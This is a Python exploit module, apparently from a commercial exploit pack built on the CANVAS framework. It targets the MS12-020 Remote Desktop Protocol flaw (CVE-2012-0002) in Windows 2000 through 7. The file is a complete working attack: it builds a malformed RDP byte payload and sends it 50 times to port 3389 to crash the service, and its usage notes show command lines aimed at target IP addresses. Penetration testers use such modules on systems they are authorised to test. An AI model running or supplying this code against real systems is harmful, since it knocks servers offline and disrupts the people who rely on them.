
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


NAME = "MS12-020 Microsoft Windows Remote Desktop Protocol Remote Denial Of Service"
DESCRIPTION = "Exploits a DoS vulnerability in Microsoft Remote Desktop"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Microsoft'
DOCUMENTATION["Date public"] = "2012-03-13"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2012-0002"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-0002'
DOCUMENTATION['CVSS'] = '10.0'
DOCUMENTATION["References"] = "http://technet.microsoft.com/en-us/security/bulletin/ms12-020"
DOCUMENTATION["Notes"] = """
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "2003", "XP", "Vista", "7"]

NOTES="""
-------------------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> MS12-020 Microsoft Windows Remote Desktop Protocol Remote Denial Of Service
-------------------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal

Payloads:
0: N/A DoS

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_ms12_020_dos/wp_ms12_020_dos.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555
"""

PORT = 3389

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets,PORT)
    return

targets = {
    0 : ["Windows Universal", (0x0000), []]
}

class theexploit(wp_exploit):
    PAYLOADS = ["N/A DoS"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.alignstack = True
        return

    def usage(self):
        self.wp_usage(targets)
        return

    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def neededListenerTypes(self):
        self.getArgs()    
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targetting version %d: %s'%(self.version,targets[self.version][0]))
        return  

    def getArgs(self):
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        payload = '\x03\x00\x00\x13\x0e\xe0\x00\x00\x00\x00\x00\x01\x00\x08\x00\x00\x00\x00\x00'
        payload += '\x03\x00\x01\xa0\x02\xf0\x80'
        payload += '7f658201940401010401010101ff301902012202010a0201000201010201000201010202ffff020102301902010102010102010102010102010002010102020420020102301c0202ffff0202fc170202ffff0201010201000201010202ffff02010204820133000500147c0001812a000800100001c00044756361811c01c0d800040008008002e00101ca03aa09040000ce0e000048004f005300540000000000000000000000000000000000000000000000000004000000000000000c0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001ca010000000000100007000100300030003000300030002d003000300030002d0030003000300030003000300030002d003000300030003000300000000000000000000000000000000000000000000000000004c00c000d0000000000000002c00c001b0000000000000003c02c0003000000726470647200000000008080636c6970726472000000a0c0726470736e640000000000c0'.decode('hex')
        payload += "\x03\x00\x00\x08\x02\xf0\x80\x28"*8
        payload += "\x03\x00\x00\x0c\x02\xf0\x80\x38\x00\x06\x03\xf0"
        payload += "\x03\x00\x00\x09\x02\xf0\x80\x21\x80"
        return payload

    def run(self):
        self.getArgs()

        payload = self.makesploit()
        self.result_error = 0

        s = self.gettcpsock()
        s.connect((self.host, self.port))
        self.log("WP> Sending Exploit")
        try:
            for i in range(0,50):
                s.sendall(payload)
                s.sendall('\x02\xf0\x80\x2e\x00\x00\x01')
                data = s.recv(5555)
        except:
            self.log("WP> Attack reported no open socket - service died?")
            self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
            return 1
        time.sleep(10)
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return 0

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
